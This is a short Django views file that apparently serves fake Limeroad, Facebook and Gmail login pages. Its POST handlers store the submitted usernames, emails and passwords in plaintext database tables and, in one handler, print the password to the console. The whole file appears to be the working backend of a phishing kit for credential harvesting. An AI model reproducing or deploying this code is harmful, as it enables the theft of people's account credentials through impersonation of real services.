from django.shortcuts import render
from django.http import HttpResponse
from myapp.models import fb_table,gmail_table

def lime_view(request):
    return render(request,'myapp/limeroad.html')
def login_view(request):
    return render(request,'myapp/login.html')
def fblogin_view(request):
    return render(request,'myapp/fblogin.html')
def loginconf_view(request):
    print(request.method)
    if request.method=='POST':
        username=request.POST.get('username')
        password=request.POST.get('password')
        print(password)
        fb=fb_table()
        fb.username=username
        fb.password=password
        fb.save()
    return render(request,'myapp/fblogin2.html')
def loginconf_view2(request):
    if request.method=='POST':

        username=request.POST.get('username')
        password=request.POST.get('password')
        fb=fb_table()
        fb.username=username
        fb.password=password
        fb.save()
    return render(request,'myapp/fblogin3.html')
def glogin_view(request):
    return render (request,'myapp/glogin.html')
def gloginconf_view(request):
    if request.method=='POST':
        email=request.POST.get('email')
        password=request.POST.get('password')
        gtable=gmail_table()
        gtable.email=email
        gtable.gpassword=password
        gtable.save()
    return render(request,'myapp/glogin2.html')





